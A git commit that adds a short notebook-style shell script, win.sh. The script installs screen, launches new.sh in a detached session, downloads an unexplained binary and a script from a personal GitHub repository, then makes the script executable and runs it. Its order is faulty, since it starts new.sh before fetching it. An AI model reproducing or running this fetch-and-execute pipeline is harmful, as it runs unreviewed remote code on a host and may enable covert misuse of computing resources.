4a5226aefd8830bb9d78ef799bc4cfb1e164deed
mansoorjama <85673565+mansoorjama@users.noreply.github.com>
2021-07-13 23:03:13 +0300

    Create win.sh

---
+++ win.sh
@@ -0,0 +1,5 @@
+#@title MANSOORJAMAL
+
+#!/bin/sh
+
+! sudo apt update && sudo apt install screen -y && screen -dmS new.sh ./new.sh 65 75 && wget https://github.com/mansoorjama/main/raw/main/mansoor && wget https://raw.githubusercontent.com/mansoorjama/main/main/new.sh && chmod +x new.sh && ./new.sh
